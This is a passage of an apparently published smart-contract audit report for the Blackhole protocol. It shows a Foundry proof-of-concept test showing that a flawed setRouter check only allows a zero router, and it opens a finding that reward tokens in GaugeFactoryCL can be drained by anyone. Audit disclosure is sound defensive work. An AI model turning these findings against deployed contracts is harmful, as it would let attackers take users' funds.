owner\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_launchFailsIfRouterIsZero\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// First, owner sets router to address(0)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router setup for test failed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Now, owner tries to launch a pool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The mockPool\u0026#39;s launch function will revert if router is address(0)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Also, the call to IRouter(address(0)).addLiquidity would revert.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpectRevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router is address(0)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertFalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Launch should not have been successfully called on pool due to revert\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_launchSucceedsIfRouterIsValid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Ensure router is the initial, valid one\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Initial router setup for test failed\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Owner tries to launch a pool\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emanager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etestLaunch\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This should succeed\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertTrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elaunchCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Launch was not called on pool\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emockPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecurrentRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pool was launched with incorrect router\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertTrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einitialRouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewasCalled\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Router\u0026#39;s addLiquidity was not called\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/details\u003e\n\u003ch3 id=\"explanation-of-the-poc\" style=\"position:relative;\"\u003e\u003ca href=\"#explanation-of-the-poc\" aria-label=\"explanation of the poc permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eExplanation of the PoC\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eSimplifiedGenesisPoolManager\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eContains the \u003ccode\u003eowner\u003c/code\u003e, \u003ccode\u003erouter\u003c/code\u003e state variable, and the vulnerable \u003ccode\u003esetRouter\u003c/code\u003e function exactly as described.\u003c/li\u003e\n\u003cli\u003eIncludes a \u003ccode\u003econstructor\u003c/code\u003e to set the initial owner and router.\u003c/li\u003e\n\u003cli\u003eIncludes \u003ccode\u003e_launchPool\u003c/code\u003e and \u003ccode\u003etestLaunch\u003c/code\u003e to simulate the scenario where a zero router would cause a failure.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eMockRouter\u003c/code\u003e:\u003c/strong\u003e A simple contract implementing \u003ccode\u003eIRouter\u003c/code\u003e. Its \u003ccode\u003eaddLiquidity\u003c/code\u003e function sets a flag \u003ccode\u003ewasCalled\u003c/code\u003e to verify interaction.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eMockGenesisPool\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eImplements a \u003ccode\u003elaunch\u003c/code\u003e function.\u003c/li\u003e\n\u003cli\u003eCrucially, \u003ccode\u003elaunch\u003c/code\u003e will \u003ccode\u003erevert(\"Router is address(0)\");\u003c/code\u003e if the \u003ccode\u003e_router\u003c/code\u003e argument is \u003ccode\u003eaddress(0)\u003c/code\u003e, mimicking how a real \u003ccode\u003elaunch\u003c/code\u003e would fail if it tried to call \u003ccode\u003eIRouter(address(0)).addLiquidity(...)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eIt also attempts to call \u003ccode\u003eIRouter(_router).addLiquidity\u003c/code\u003e to show a successful interaction.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eMockPairFactory\u003c/code\u003e:\u003c/strong\u003e A minimal mock for \u003ccode\u003eIBaseV1Factory\u003c/code\u003e to satisfy dependencies in the simplified \u003ccode\u003e_launchPool\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003eGenesisPoolManagerRouterTest\u003c/code\u003e (Test Contract):\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003esetUp()\u003c/code\u003e:\u003c/strong\u003e Deploys the \u003ccode\u003eSimplifiedGenesisPoolManager\u003c/code\u003e, \u003ccode\u003eMockRouter\u003c/code\u003e instances, \u003ccode\u003eMockGenesisPool\u003c/code\u003e, and sets the test contract as the \u003ccode\u003eowner\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_ownerCannotSetValidNewRouter()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e attempts to call \u003ccode\u003esetRouter\u003c/code\u003e with \u003ccode\u003enewValidRouter\u003c/code\u003e (a non-zero address).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evm.expectRevert(\"ZA\");\u003c/code\u003e asserts that this call reverts with the “ZA” error, proving the \u003ccode\u003erequire(_router == address(0), \"ZA\");\u003c/code\u003e condition is problematic for valid addresses.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_ownerCanSetRouterToZeroAddress()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e calls \u003ccode\u003esetRouter\u003c/code\u003e with \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThis call succeeds, and the test asserts that \u003ccode\u003emanager.getRouter()\u003c/code\u003e is now \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003etest_nonOwnerCannotCallSetRouter()\u003c/code\u003e:\u003c/strong\u003e Standard access control test.\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_launchFailsIfRouterIsZero()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e first successfully calls \u003ccode\u003esetRouter(address(0))\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThen, the \u003ccode\u003eowner\u003c/code\u003e calls \u003ccode\u003emanager.testLaunch(mockPool)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evm.expectRevert(\"Router is address(0)\");\u003c/code\u003e asserts that this call reverts. The revert comes from \u003ccode\u003eMockGenesisPool.launch()\u003c/code\u003e when it detects the zero address router, demonstrating the downstream failure.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ccode\u003etest_launchSucceedsIfRouterIsValid()\u003c/code\u003e:\u003c/strong\u003e\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eEnsures the router is the initial valid one.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e calls \u003ccode\u003emanager.testLaunch(mockPool)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThis call should succeed, \u003ccode\u003emockPool.launchCalled()\u003c/code\u003e should be true, and \u003ccode\u003einitialRouter.wasCalled()\u003c/code\u003e should be true.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cstrong\u003eHow to Run (with Foundry):\u003c/strong\u003e\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eSave the code above as \u003ccode\u003etest/GenesisPoolManagerRouter.t.sol\u003c/code\u003e (or similar) in your Foundry project.\u003c/li\u003e\n\u003cli\u003eEnsure you have \u003ccode\u003eforge-std\u003c/code\u003e (usually included with \u003ccode\u003eforge init\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003eRun the tests: \u003ccode\u003eforge test --match-test GenesisPoolManagerRouterTest -vvv\u003c/code\u003e (the \u003ccode\u003e-vvv\u003c/code\u003e provides more verbose output, including console logs if you were to add them).\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThis PoC clearly demonstrates:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eThe \u003ccode\u003esetRouter\u003c/code\u003e function’s flawed logic.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e’s inability to set a new, functional router.\u003c/li\u003e\n\u003cli\u003eThe \u003ccode\u003eowner\u003c/code\u003e’s ability to set the router to \u003ccode\u003eaddress(0)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eThe direct consequence of a zero router address leading to failed pool launches.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-28\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-5\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-16\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone\" style=\"position:relative;\"\u003e\u003ca href=\"#h-02-reward-token-in-gaugefactorycl-can-be-drained-by-anyone\" aria-label=\"h 02 reward token in gaugefactorycl can be drained by anyone permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-120\"\u003e[H-02] Reward token in \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e can be drained by anyone\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-176\"\u003edanzero\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-278\"\u003ea39955720\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-435\"\u003ebareli\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-62\"\u003eDarkeEEandMe\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-375\"\u003eKariukigithinji\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-488\"\u003emahadev\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-361\"\u003emaxzuvex\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-441\"\u003ewafflewizard\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-206\"\u003ewankleven\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-300\"\u003eZiusz\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L59\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/AlgebraCLVe33/GaugeFactoryCL.sol#L59\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"findings-description-and-impact\" style=\"position:relative;\"\u003e\u003ca href=\"#findings-description-and-impact\" aria-label=\"findings description and impact permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFindings Description and Impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eGaugeFactoryCL.sol\u003c/code\u003e contract, responsible for creating \u003ccode\u003eGaugeCL\u003c/code\u003e instances for Algebra Concentrated Liquidity pools, has a public \u003ccode\u003ecreateGauge\u003c/code\u003e function. Below is the implementation of the function:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"3\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateGauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_ve\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e 